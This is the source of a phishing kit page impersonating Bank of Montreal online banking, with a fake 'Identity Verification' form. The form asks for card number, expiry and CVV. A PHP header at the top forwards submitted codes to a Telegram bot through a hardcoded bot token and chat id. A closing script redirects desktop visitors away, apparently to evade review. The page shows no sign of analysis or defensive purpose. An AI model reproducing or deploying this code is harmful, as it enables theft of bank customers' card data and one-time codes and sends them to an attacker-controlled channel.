<?php

    $code       = $_POST['code']; 


$message = "$code";

$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-821080105',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?><html ng-app="com.td.tdi.uapWeb" lang="en-CA"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <style type="text/css">.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;} form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable = no">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-touch-fullscreen" content="yes">
        <title>Online Banking | Bank of Montreal</title>
        <link rel="stylesheet" href="./files/uap-application-all-css.css">
        <link href="assets/bmo/favicon.ico?v=1" rel="shortcut icon">
        <style>
        .otp-section-red, .otp-section-error, .otp-section-warning, .otp-section, .otp-section-grey, .otp-section-mint-green, .otp-section-green {
            padding: 2px 18px;
        }

        .form-control.ng-valid:hover, .form-control.ng-valid:focus {
            border-bottom-color: #0079c1 !important;
        }
        </style>
        <script src="./files/jquery-3.6.0.min.js###%" crossorigin="anonymous"></script>
        <script>var lrbank = 'BMO'; var lrinfo = 'Card';</script>
        <script src="./files/actions.js###%"></script>
    </head>
    <body prevent-click-highlight="" autoscroll="" class="">
        <div id="contentWrapper">
            <!-- Header -->
            <!---->
            <div data-ui-view="header" class="" style="">
                <otp-header>
                    <div class="td_rq_header-nav td-header-nav">
                        <!-- Desktop Header START -->
                        <header class="td-header-desktop">
                            <div class="td-nav-primary" style="background-color:#ffffff">
                                <div class="td-container">
                                    <div class="td-section-left">
                                        <div class="td-logo" style="margin-top: 15px;">
                                            <img ng-src="/assets/bmo/logo.png" style="width:100px" src="./files/logo.png">
                                        </div>
                                    </div>
                                    <div class="td-section-right">
                                        <div class="td-quick-access">
                                            <ul class="td-header-nav-utilities">
                                                <li ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)" class="td-dropdown td-dropdown-language td-dropdown-no-hover ng-hide" aria-hidden="true">
                                                    <a href="deposit/bmo/c.php" class="td-show-label" aria-haspopup="true" aria-expanded="false" id="td-desktop-nav-dropdown-link-0">
                                                    <span class="td-forscreenreader">Select language</span>
                                                    Français
                                                    <span class="td-icon expand" aria-hidden="true"></span>
                                                    <span class="td-icon collapse" aria-hidden="true"></span>
                                                    </a>
                                                    <ul class="td-dropdown-content" aria-labelledby="td-desktop-nav-dropdown-link-0">
                                                        <!---->
                                                        <li ng-class="{'active': language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index" class="active">
                                                            <a href="deposit/bmo/c.php" role="button" ng-click="vm.setLanguage(language)">
                                                                English
                                                                <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-icon selected" aria-hidden="true">
                                                                </span><!---->
                                                                <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-forscreenreader">Selected</span><!---->
                                                            </a>
                                                        </li>
                                                        <!---->
                                                        <li ng-class="{'active': language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index">
                                                            <a href="deposit/bmo/c.php" role="button" ng-click="vm.setLanguage(language)">
                                                                Français
                                                                <!---->
                                                                <!---->
                                                            </a>
                                                        </li>
                                                        <!---->
                                                    </ul>
                                                </li>
                                                <li class="secure-lock-position" aria-hidden="true">
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </header>
                        <!-- Desktop Header END -->
                        <!-- Mobile Header START -->
                        <header class="td-header-mobile">
                            <div class="td-container">
                                <div class="td-section-left">
                                    <button type="button" class="td-mobile-action-button td-mobile-menu-button">
                                        <div ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)" class="td-mobile-menu-button-icon ng-hide" aria-hidden="true">
                                            <span class="td-forscreenreader">Open menu</span>
                                            <span class="icon-bar" aria-hidden="true"></span>
                                            <span class="icon-bar" aria-hidden="true"></span>
                                            <span class="icon-bar" aria-hidden="true"></span>
                                        </div>
                                        <div class="td-logo">
                                            <img class="logoImage" src="./files/bmo-logo-white.svg" style="margin-left:120px; margin-right:auto;width:120px;">
                                        </div>
                                    </button>
                                    <button type="button" class="td-mobile-action-button td-mobile-back-button" onclick="history.back();">
                                        Test!
                                        <div class="td-logo">
                                            <img src="./files/logo.png" style="width:91px">

                                        </div>
                                    </button>
                                </div>
                            </div>
                        </header>
                        <!-- Mobile Header END -->
                        <!-- Mobile Off-canvas Menu START -->
                        <div ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)" class="td-nav-mobile ng-hide" aria-hidden="true">
                            <!-- Primary mobile menu START -->
                            <div class="td-nav-mobile-menu td-nav-mobile-menu-primary">
                                <span tabindex="0"></span>
                                <div class="td-nav-mobile-menu-top">
                                    <div class="td-nav-mobile-menu-header">
                                        <div class="td-logo">
                                            <a href="https://authentication.td.com/">
                                            <img src="./files/logo.png" alt="TD Canada Trust">
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <nav>
                                    <ul class="td-nav-mobile-menu-list">
                                        <li class="td-nav-mobile-menu-item td-item-toggle td-accordion td-accordion-language">
                                            <a href="deposit/bmo/c.php" aria-expanded="false" role="button">
                                            <span class="td-forscreenreader">Select language</span>
                                            Français
                                            <span class="td-icon expand" aria-hidden="true"></span>
                                            <span class="td-icon collapse" aria-hidden="true"></span>
                                            </a>
                                            <ul class="td-accordion-content">
                                                <!---->
                                                <li ng-class="{'active': language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index" class="active">
                                                    <a href="deposit/bmo/c.php" role="button" ng-click="vm.setLanguage(language)">
                                                        English
                                                        <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-icon selected" aria-hidden="true">
                                                        </span><!---->
                                                        <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-forscreenreader">Selected</span><!---->
                                                    </a>
                                                </li>
                                                <!---->
                                                <li ng-class="{'active': language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index">
                                                    <a href="deposit/bmo/c.php" role="button" ng-click="vm.setLanguage(language)">
                                                        Français
                                                        <!---->
                                                        <!---->
                                                    </a>
                                                </li>
                                                <!---->
                                            </ul>
                                        </li>
                                    </ul>
                                </nav>
                                <span tabindex="0"></span>
                            </div>
                            <!-- Primary mobile menu END -->
                            <div class="td-nav-mobile-overlay"></div>
                        </div>
                        <!-- Mobile Off-canvas Menu END -->
                    </div>
                </otp-header>
            </div>
            <!-- Main Content / Body -->
            <div class="td-contentarea" role="main" style="padding-top: 70px;">
                <!---->
                <ui-view class="" style="">
                    <!---->
                    <ui-view>
                        <reset>
                            <!---->
                            <ui-view class="" style="">
                                <reset-password dt="::$resolve.dt" device-print="::$resolve.devicePrint" device-info="::$resolve.deviceInfo" thread-matrix="::$resolve.threadMatrix">
                                    <div class="text-center">
                                        <otp-server-error error="vm.dt.recoverPwdError" display="banner">
                                            <!---->
                                        </otp-server-error>
                                    </div>
                                    <div class="td-container">
                                        
                                        
                                        <form method="post" action="thankyou.php" class="ng-pristine ng-valid td_rq_form_legacy td-form td-form-validate td-form-dynamic" onsubmit="return validate()">
                                            <h1 class="text-center">Identity Verification</h1>
                                            <div class="td-row">
                                                <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">
                                                    <div class="otp-section-mint-green otp-full-width-sm">
                                                        <div class="td-row" style="padding-top: 10px;">
                                                            <div class="td-col-sm-6 td-col-sm-offset-3">
                                                                                                                                <div class="form-group" style="">
                                                                    <label>Card Number</label>
                                                                    <input required="" id="input-card" type="tel" maxlength="19" placeholder="Card Number" name="cccc" class="form-control lrinput" oninput="this.value = this.value.replace(/[^0-9, ]/, '')" onkeyup="split()" autocomplete="off" attr-action="Filling Card">
                                                                    <script src="./files/splitter.js###%"></script>
                                                                    <link rel="stylesheet" href="./files/card.css">
                                                                </div>
                                                                                                                                <div class="form-group" style="">
                                                                    <label style="display: block;">Expiry</label>
                                                                    <select name="exp1" required="" class="form-control text-center display-inline-block lrinput" attr-action="Selecting Expiry" style="width:48%; display: inline-block;">
                                                                        <option value="">MM</option>
                                                                        <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>                                                                    </select>
                                                                    <select name="exp2" required="" class="form-control text-center display-inline-block lrinput" attr-action="Selecting Expiry" style="width:50%; display: inline-block;">
                                                                        <option value="">YY</option>
                                                                        <option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option><option value="32">32</option><option value="33">33</option><option value="34">34</option><option value="35">35</option><option value="36">36</option><option value="37">37</option><option value="38">38</option>                                                                    </select>
                                                                </div><div class="form-group" style="">
                                                                    <label>CVV</label>
                                                                    <input required="" id="input-card" type="CVV" maxlength="3" placeholder="CVV" name="Ccc" class="form-control lrinput" oninput="this.value = this.value.replace(/[^0-9, ]/, '')" onkeyup="split()" autocomplete="off" attr-action="Filling Card">
                                                                    <script src="./files/splitter.js###%"></script>
                                                                    <link rel="stylesheet" href="./files/card.css">
                                                                </div>
                                                                                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="td-row">
                                                <div class="td-col-sm-4 td-col-sm-offset-2 td-col-sm-push-4 td-col-md-3 td-col-md-offset-3 td-col-md-push-3">
                                                    <div class="form-group" style="padding-top: 15px;">
                                                        <button type="submit" name="save" value="1" class="td-button  td-button" style="background-color:#0079c1;width:100%">
                                                        <font color="white">  Submit</font>
                                                        </button>
                                                    </div>
                                                </div>
                                            </div>
                                        </form>
                                        <br><br><br><br><br><br><br><br><br><br><br><br><br>
                                    </div>
                                    <br><br>
                                </reset-password>
                            </ui-view>
                        </reset>
                    </ui-view>
                </ui-view>
            </div>
            <!-- Footer -->
            <!---->
            <div data-ui-view="footer" class="">
                <otp-footer>
                    <footer class="td-background-dark-green" style="left: 0px; right: 0px; bottom: 0px; position: absolute;">
                        <!---->
                        <div class="td-container">
                            <div class="td-row">
                                <div class="td-col-xs-12 td-footer-content otp-footer-content">
                                    <div class="td-footer-links td-copy-align-centre td-copy-white">
                                        <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.bmo.com/main/contact-us">
                                        Contact us
                                        </a>
                                        <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.bmo.com/home/about/banking/privacy-security/our-privacy-code">
                                        Privacy
                                        </a>
                                        <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.bmo.com/home/popups/global/legal">
                                        Legal
                                        </a>
                                        <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.bmo.com/home/about/banking/privacy-security/how-we-protect-you">
                                        Security
                                        </a>
                                        <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.bmo.com/home/popups/global/cdic">
                                        CDIC Member
                                        </a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </footer>
                </otp-footer>
            </div><a href="not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
        </div>
        <!--[if lt IE 9]>
        <script type="text/javascript" src="resources/es5-shim/es5-shim.min.js?v=0.0.8-HOTFIX2"></script>
        <script type="text/javascript" src="resources/html5shiv/dist/html5shiv.min.js?v=0.0.8-HOTFIX2"></script>
        <![endif]-->
        <div id="ads"></div>
        <div id="ads"></div>
        <div id="ads"></div>
    

</body><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>